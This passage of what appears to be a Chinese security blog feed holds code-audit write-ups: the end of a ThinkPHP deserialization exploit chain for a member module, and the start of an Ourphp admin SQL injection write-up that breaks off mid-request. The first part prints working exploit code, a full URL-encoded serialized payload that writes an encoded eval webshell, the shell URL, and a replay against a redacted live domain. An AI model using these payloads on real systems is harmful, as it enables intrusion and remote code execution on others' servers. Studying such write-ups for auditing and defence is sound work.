class="hljs-number">3600</span>,<br>                <span class="hljs-string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>                <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;path&#x27;</span>  =&gt; <span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,<br>                <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>            ];<br>            <span class="hljs-keyword">$this</span>-&gt;tag = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">Memcached</span> = <span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>(<span class="hljs-title">new</span> \<span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>());<br>    <span class="hljs-variable">$Output</span> = <span class="hljs-keyword">new</span> think\console\Output(<span class="hljs-variable">$Memcached</span>);<br>    <span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> think\db\Query(<span class="hljs-variable">$Output</span>);<br>    <span class="hljs-variable">$HasOne</span> = <span class="hljs-keyword">new</span> think\model\relation\HasOne(<span class="hljs-variable">$model</span>);<br>    <span class="hljs-variable">$window</span> = <span class="hljs-keyword">new</span> think\process\pipes\Windows(<span class="hljs-keyword">new</span> think\model\Pivot(<span class="hljs-variable">$Output</span>,<span class="hljs-variable">$HasOne</span>));<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$window</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行exp，生成payload</p><p><a href="https://imgtu.com/i/hGo9MQ"><img src="https://z3.ax1x.com/2021/08/29/hGo9MQ.png" alt="hGo9MQ.png"></a></p><p>发送payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/member.php/member/Msg/listqun?config[cfg]=O%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">34</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">00</span>files%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>append%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getError%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>Crelation%<span class="hljs-number">5</span>CHasOne%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">15</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>selfRelation%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>bindAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>query%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">14</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cdb%<span class="hljs-number">5</span>CQuery%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>model%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">20</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">28</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">00</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">30</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Csession%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CMemcached%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>handler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">23</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Ccache%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CFile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>options%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">5</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>expire%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">3600</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cache_subdir%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>prefix%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">122</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">7</span>Cconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>DaaaPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUWydjY<span class="hljs-number">2</span>MnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>g%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fa.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">13</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>data_compress%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>tag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>styles%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>parent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoFZn"><img src="https://z3.ax1x.com/2021/08/29/hGoFZn.png" alt="hGoFZn.png"></a></p><p>成功getshell，文件名是固定的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/a.php<span class="hljs-number">12</span>ac<span class="hljs-number">95</span>f<span class="hljs-number">1498</span>ce<span class="hljs-number">51</span>d<span class="hljs-number">2</span>d<span class="hljs-number">96</span>a<span class="hljs-number">249</span>c<span class="hljs-number">09</span>c<span class="hljs-number">1998</span>.php<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoSxg"><img src="https://z3.ax1x.com/2021/08/29/hGoSxg.png" alt="hGoSxg.png"></a></p><p>执行成功</p><p><a href="https://imgtu.com/i/hGokaq"><img src="https://z3.ax1x.com/2021/08/29/hGokaq.png" alt="hGokaq.png"></a></p><h2 id="案例复现"><a href="#案例复现" class="headerlink" title="案例复现"></a>案例复现</h2><p>注册用户</p><p><a href="https://imgtu.com/i/hGoAI0"><img src="https://z3.ax1x.com/2021/08/29/hGoAI0.png" alt="hGoAI0.png"></a></p><p>发送payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxxxxxxx.net/member.php/member/Msg/listqun?config[cfg]=O%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">34</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">00</span>files%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>append%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getError%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>Crelation%<span class="hljs-number">5</span>CHasOne%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">15</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>selfRelation%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>bindAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>query%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">14</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cdb%<span class="hljs-number">5</span>CQuery%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>model%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">20</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">28</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">00</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">30</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Csession%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CMemcached%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>handler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">23</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Ccache%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CFile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>options%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">5</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>expire%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">3600</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cache_subdir%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>prefix%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">122</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">7</span>Cconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>DaaaPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUWydjY<span class="hljs-number">2</span>MnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>g%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fa.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">13</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>data_compress%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>tag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>styles%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>parent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoViV"><img src="https://z3.ax1x.com/2021/08/29/hGoViV.png" alt="hGoViV.png"></a></p><p>成功写入shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxxxxxxxx.net/a.php<span class="hljs-number">12</span>ac<span class="hljs-number">95</span>f<span class="hljs-number">1498</span>ce<span class="hljs-number">51</span>d<span class="hljs-number">2</span>d<span class="hljs-number">96</span>a<span class="hljs-number">249</span>c<span class="hljs-number">09</span>c<span class="hljs-number">1998</span>.php<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoZGT"><img src="https://z3.ax1x.com/2021/08/29/hGoZGT.png" alt="hGoZGT.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：Ourphp后台SQL注入漏洞</title>
    <link href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AOurphp%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AOurphp%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h1><h2 id="ourphp-cmd-php"><a href="#ourphp-cmd-php" class="headerlink" title="ourphp_cmd.php"></a>ourphp_cmd.php</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>/client/manage/ourphp_cmd.php</p><p>可控参数$_POST[‘xx’]被直接拼接进SQL语句，造成SQL注入</p><p><a href="https://imgtu.com/i/hGoWLj"><img src="https://z3.ax1x.com/2021/08/29/hGoWLj.png" alt="hGoWLj.png"></a></p><p>/config/ourphp_mysqli.php</p><p>执行SQL语句</p><p><a href="https://imgtu.com/i/hGoRyQ"><img src="https://z3.ax1x.com/2021/08/29/hGoRyQ.png" alt="hGoRyQ.png"></a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载源码：<a href="https://www.ourphp.net/">https://www.ourphp.net/</a></p><p>登录后台，复制Cookie中的PHPSESSID到poc中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost/admin.php<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGo4wn"><img src="https://z3.ax1x.com/2021/08/29/hGo4wn.png" alt="hGo4wn.png"></a></p><p>时间盲注</p><p><a href="https://imgtu.com/i/hGo5oq"><img src="https://z3.ax1x.com/2021/08/29/hGo5oq.png" alt="hGo5oq.png"></a></p><p>数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /client/manage/ourphp_cmd.php?ourphp_cms=cmd HTTP/<span class="hljs-number">1</span>.<span 